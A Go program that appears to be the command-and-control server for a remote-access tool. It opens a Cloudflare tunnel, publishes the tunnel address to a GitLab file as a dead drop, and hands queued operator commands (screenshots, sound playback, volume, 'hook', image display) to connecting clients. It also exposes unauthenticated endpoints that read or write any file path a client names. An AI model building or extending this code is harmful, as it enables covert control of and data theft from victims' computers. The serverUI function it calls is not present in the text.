package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/joho/godotenv"
)

// Global Variables

var mutex sync.Mutex
var userInput string = ""
var buf bytes.Buffer
var tunnelURL string = ""
var tunnelURLChan = make(chan string)

type GitLabUpdatePayload struct {
	Branch        string `json:"branch"`
	Content       string `json:"content"`
	CommitMessage string `json:"commit_message"`
}

type ProgressReport struct {
	Progress string `json:"progress"`
}

func updateGitLabFile(projectID, filePath, gitlabToken, tunnelURL string) error {

	encodedPath := url.PathEscape(filePath)
	apiURL := fmt.Sprintf("https://gitlab.com/api/v4/projects/%s/repository/files/%s", projectID, encodedPath)

	payload := GitLabUpdatePayload{
		Branch:        "main",
		Content:       tunnelURL,
		CommitMessage: "Update Cloudflare tunnel URL",
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPut, apiURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}

	req.Header.Set("PRIVATE-TOKEN", gitlabToken)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("gitlab API error (%d): %s", resp.StatusCode, string(body))
	}

	fmt.Println("Successfully updated tunnel.txt on GitLab!")
	return nil
}

func ensureCloudflared() string {
	// Name the binary appropriately for Windows vs Linux
	binName := "cloudflared"
	if runtime.GOOS == "windows" {
		binName = "cloudflared.exe"
	}

	// If it doesn't exist locally, download it automatically
	if _, err := os.Stat(binName); os.IsNotExist(err) {
		fmt.Printf("Downloading cloudflared for %s/%s...\n", runtime.GOOS, runtime.GOARCH)

		// Map Go runtime architecture names to Cloudflare's release asset names
		arch := runtime.GOARCH
		if arch == "amd64" {
			arch = "amd64"
		} else if arch == "386" {
			arch = "386"
		} else if arch == "arm64" {
			arch = "arm64"
		}

		url := fmt.Sprintf("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-%s-%s", runtime.GOOS, arch)
		if runtime.GOOS == "windows" {
			url += ".exe"
		}

		resp, err := http.Get(url)
		if err != nil {
			panic(fmt.Sprintf("Failed to download cloudflared: %v", err))
		}
		defer resp.Body.Close()

		out, err := os.Create(binName)
		if err != nil {
			panic(fmt.Sprintf("Failed to create binary file: %v", err))
		}
		defer out.Close()

		_, err = io.Copy(out, resp.Body)
		if err != nil {
			panic(fmt.Sprintf("Failed to save binary: %v", err))
		}

		// Make executable on Linux/Unix
		if runtime.GOOS != "windows" {
			os.Chmod(binName, 0755)
		}
		fmt.Println("Cloudflared downloaded successfully.")
	}

	return binName
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	// 1. Get the custom instruction from the HTTP header

	fileName := r.Header.Get("X-File-Name")

	// 2. Create the blank local file on disk
	dst, err := os.Create(fileName)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer dst.Close()

	// 3. Stream the bytes directly from the network connection to the disk.
	_, err = io.Copy(dst, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	fmt.Fprint(w, "File received successfully!")
}

func handleProgressUpdate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var report ProgressReport
	err := json.NewDecoder(r.Body).Decode(&report)
	if err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		fmt.Println("Error decoding JSON:", err)
		return
	}

	fmt.Println(report.Progress)

	w.WriteHeader(http.StatusOK)
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	// Get the file path from query params or body
	filePath := r.URL.Query().Get("file")

	file, err := os.Open(filePath)
	if err != nil {
		http.Error(w, err.Error(), http.StatusNotFound)
		return
	}
	defer file.Close()

	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, filepath.Base(filePath)))
	io.Copy(w, file)
}

func runServer() error {
	if err := godotenv.Load(); err != nil {
		return fmt.Errorf("loading .env file: %w", err)
	}

	gitlabToken := os.Getenv("TOKEN")

	binPath := ensureCloudflared()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	cmd := exec.CommandContext(
		ctx,
		"./"+binPath,
		"tunnel",
		"--protocol",
		"http2",
		"--url",
		"http://localhost:10000",
	)

	cmd.Stdout = io.Discard
	cmd.Stderr = &buf

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("starting cloudflared: %w", err)
	}

	go findTunnelURL()

	tunnelURL = <-tunnelURLChan

	time.Sleep(2 * time.Second)

	fmt.Println("Tunnel is active.")
	fmt.Println("The tunnel URL is:", tunnelURL)

	if err := updateGitLabFile(
		"Plexisity1%2Ftunnel-url",
		"tunnel-url.txt",
		gitlabToken,
		tunnelURL,
	); err != nil {
		return fmt.Errorf("updating GitLab: %w", err)
	}

	http.HandleFunc("/upload", uploadHandler)
	http.HandleFunc("/get-command", commandHandler)
	http.HandleFunc("/download", downloadHandler)
	http.HandleFunc("/progress", handleProgressUpdate)

	go receiveInput()

	fmt.Println("Receiver running on port 10000.")
	return http.ListenAndServe(":10000", nil)
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	mutex.Lock()
	command := strings.Fields(userInput)
	if len(command) == 0 {
		fmt.Fprint(w, "idle")
		mutex.Unlock()
		return
	}

	switch command[0] {
	case "idle":
		fmt.Fprint(w, userInput)

	case "ss":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
			userInput = "idle"
			break
		}

		fmt.Fprint(w, userInput)
		userInput = ""
		fmt.Println("sending screenshot command")

	case "sound":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
			fmt.Println("Hint try sound ./(yourpath)")
			userInput = "idle"
			break
		} else {
			fmt.Fprint(w, userInput)
			command = nil
			userInput = "idle"
			fmt.Println("sent audio command")
		}

	case "vol":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
			fmt.Println("Hint try vol (number)")
			userInput = "idle"
			break
		} else {
			fmt.Fprint(w, userInput)
			command = nil
			userInput = "idle"
			fmt.Println("sent volume command")
		}

	case "hook":
		fmt.Fprint(w, userInput)
		command = nil
		userInput = "idle"
		fmt.Println("sent hook command")

	case "img":
		if len(command) < 2 {
			fmt.Println("Invalid usage", userInput)
			fmt.Println("Hint try img <path> <ms> <amount of pictures>")
			userInput = "idle"
			break
		} else {
			fmt.Fprint(w, userInput)
			command = nil
			userInput = "idle"
			fmt.Println("Sent img command")
		}

	case "help":
		fmt.Print("\033[H\033[2J")

		fmt.Print("Available commands:\n")
		fmt.Println("  ss - <number> Take a screenshot")
		fmt.Println("  sound <file> - Play audio file")
		fmt.Println("  vol <number> - Set volume")
		fmt.Println("  img <png> <ms> <quantity>")
		fmt.Println("  help - Show this help message")
		userInput = "idle"
		fmt.Fprint(w, "idle")

	default:
		fmt.Fprint(w, "idle")
		fmt.Println("Unknown command received:", userInput)
	}

	defer mutex.Unlock()
}

func useRegex(s string) string {
	re := regexp.MustCompile(`(?i)https://[a-z0-9-]+\.trycloudflare\.com`)

	return re.FindString(s)
}

func findTunnelURL() string {
	for {
		url := useRegex(buf.String())
		if url != "" {
			tunnelURLChan <- url
			break
		}
		time.Sleep(1 * time.Second)
	}
	return ""
}

func receiveInput() {
	scanner := bufio.NewScanner(os.Stdin)

	for scanner.Scan() {
		mutex.Lock()
		userInput = scanner.Text()
		mutex.Unlock()
	}

	// Check for errors
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, "reading standard input:", err)
	}
}

func main() {

	go receiveInput()
	go func() {
		if err := runServer(); err != nil {
			fmt.Println(err)
		}
	}()

	serverUI()

}
